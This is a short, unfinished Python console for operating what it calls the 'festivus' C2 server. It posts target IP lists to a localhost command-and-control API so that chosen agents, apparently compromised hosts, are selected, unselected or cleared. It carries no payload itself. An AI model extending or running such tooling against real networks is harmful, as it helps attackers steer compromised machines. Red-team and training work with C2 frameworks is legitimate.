#!/usr/bin/python3

"""
Description: This program is used to interactively manage the festivus C2 server.
"""

import requests
import json

URL = "http://localhost:80"

def options():
    print("SHOW AGENTS\tList all agents")
    print("SHOW TARGETS\tList targeted agents")
    print("TARGET <IP(s)>\tSet specified IPs as targets (IPs should be comma separated)")
    print("UNTARGET <IP(s)>\tRemove specified IPs as targets (IPs should be comma separated)")
    print("CLEAR TARGETS\tRemove all targets")

def set_targets(ips):
    data = {"ips": ips}
    r = requests.post(f"{URL}/set-targets", json=data)

def untarget(ips):
    data = {"ips": ips}
    r = requests.post(f"{URL}/untarget", json=data)

def clear_targets():
    r = requests.post(f"{URL}/clear-targets")

def main():
    print("Festivus C2 Manager\n\n")
    while True:
        userin = input("Festivus> ")
        #Process one word commands
        pass
        #Process multi-word commands
        splits = userin.split(" ")
        if splits[0].upper() == "TARGET":
            ips = splits[1].split(",")
            set_targets(ips)
        elif splits[0].upper() == "UNTARGET":
            ips = splits[1].split(",")
            untarget(ips)
        elif splits[0].upper() == "CLEAR" and splits[1].upper() == "TARGETS":
            clear_targets()

        


if __name__ == "__main__":
    main()